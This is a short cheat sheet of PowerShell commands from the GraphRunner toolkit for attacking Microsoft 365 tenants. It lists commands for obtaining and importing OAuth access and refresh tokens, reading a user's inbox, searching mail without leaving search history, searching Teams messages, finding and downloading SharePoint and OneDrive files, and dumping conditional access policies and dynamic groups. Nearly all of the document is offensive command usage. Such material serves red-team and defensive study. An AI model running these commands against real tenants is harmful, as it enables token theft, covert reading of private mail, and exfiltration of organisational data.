### Source
https://github.com/dafthack/GraphRunner

### Get tokens via Device Code Flow
```
Get-GraphTokens
```

### Get access token using refresh token
```
Invoke-RefreshGraphTokens -TenantId <tenantId> -RefreshToken "<refreshToken>"
```

### Read last emails
```
Get-Inbox -userid <user> -tokens $tokens
```

### Search for term inside the last 100 Outlook messages (search will not end up in history)
```
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "<term>" -MessageCount 100
```

### Search for term inside MS Teams messages
```
Invoke-SearchTeams -Tokens $tokens -SearchTerm "<term>"
```

### Search for filetype or term and download file
```
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "filetype:xlsx"
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm "<term>"
```

### Dump conditional access policies
```
Invoke-DumpCAPS -tokens $tokens
```

### Dump dynamic groups
```
Get-DynamicGroups -tokens $tokens
```

### Get sharepoint urls
```
Get-SharePointSiteURLs -tokens $tokens
```

### Import tokens
```
Invoke-ImportTokens -AccessToken <accessToken> -RefreshToken <refreshToken>
```

